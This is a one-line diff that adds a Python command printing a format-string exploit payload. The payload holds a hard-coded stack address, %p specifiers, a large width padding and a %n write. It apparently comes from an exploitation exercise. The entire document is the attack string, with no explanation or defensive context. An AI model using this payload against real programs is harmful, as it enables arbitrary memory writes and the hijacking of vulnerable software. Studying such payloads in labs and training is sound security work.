@@ -1,0 +1,1 @@
+python -c 'print "\xcc\xf4\xff\xbf%p %p %134513806.0s %n"'
